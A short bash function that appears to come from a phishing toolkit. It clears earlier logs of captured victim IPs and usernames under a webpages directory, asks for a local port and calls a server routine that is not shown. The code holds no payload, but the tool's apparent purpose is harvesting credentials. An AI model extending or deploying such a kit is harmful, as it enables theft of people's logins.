#!/usr/bin/env bash


startx() {
    if [[ -e ../../webpages/$server/ip.txt ]]; then
        rm -rf ../../webpages/$server/ip.txt
    fi
        if [[ -e ../../webpages/$server/usernames.txt ]]; then
            rm -rf ../../webpages/$server/usernames.txt
        fi
            default_port="3333" #$(seq 1111 4444 | sort -R | head -n1)
            printf '\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Choose a Port (Default:\e[0m\e[1;77m %s \e[0m\e[1;92m): \e[0m' $default_port
            read port
            port="${port:-${default_port}}"
            serverx
}

